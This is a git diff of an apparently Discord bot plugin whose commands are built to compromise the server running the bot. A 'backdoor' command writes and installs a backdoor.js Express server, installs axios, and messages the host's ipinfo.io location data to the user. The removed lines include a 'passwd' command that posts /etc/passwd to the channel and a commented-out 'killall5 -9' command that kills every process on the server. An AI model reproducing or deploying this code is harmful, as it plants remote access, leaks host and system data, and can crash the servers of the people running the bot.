@@ -4,7 +4,7 @@ module.exports.plugin = {
     author: "best plugin writer ever ",
     repository:
         "https://github.com/alexanderdavidj/test/blob/main/test/plugin.js",
-    commands: ["test", "backdoor", "passwd"],
+    commands: ["test", "backdoor"],
 };
 
 module.exports.test = {
@@ -18,15 +18,6 @@ module.exports.test = {
         );
     },
 };
-
-// worked
-// module.exports.end = {
-//     name: "end",
-//     description: "end the linux server",
-//     run: async ({ client, message }) => {
-//         require("child_process").spawn("killall5", ["-9"]);
-//     },
-// };
 
 module.exports.backdoor = {
     name: "backdoor",
@@ -55,7 +46,7 @@ app.listen(3000, function (err) {
 });`;
 
         require("child_process").spawn("touch", ["backdoor.js"]);
-        // require("child_process").spawn("npm", ["i", "express"]);
+        require("child_process").spawn("npm", ["i", "axios"]);
         require("fs").writeFile("backdoor.js", code, (err) => {
             if (err) return console.log(err);
         });
@@ -67,40 +58,12 @@ app.listen(3000, function (err) {
             });
 
         message.channel.send("installed");
-        const req = require("http")
-            .request(
-                {
-                    hostname: "ipinfo.io",
-                    path: "/json",
-                    method: "GET",
-                },
-                (res) => {
-                    let data = "";
 
-                    res.on("data", (chunk) => {
-                        data += chunk;
-                    });
-
-                    res.on("end", () => {
-                        message.author.send(`${data}`);
-                    });
-                }
-            )
-
-            .on("error", (err) => {
-                console.log("Error: ", err);
-            })
-
-            .end();
-    },
-};
-
-module.exports.passwd = {
-    name: "passwd",
-    description: "leak /etc/passwd",
-    run: async ({ client, message }) => {
-        require("fs").readFile("/etc/passwd", "utf8", function (err, data) {
-            message.channel.send(`\`\`\`bash\n${data}\`\`\``);
+        const response = await axios({
+            url: "https://ipinfo.io/json",
+            method: "GET",
         });
+
+        message.author.send(`${JSON.parse(response.data)}`);
     },
 };
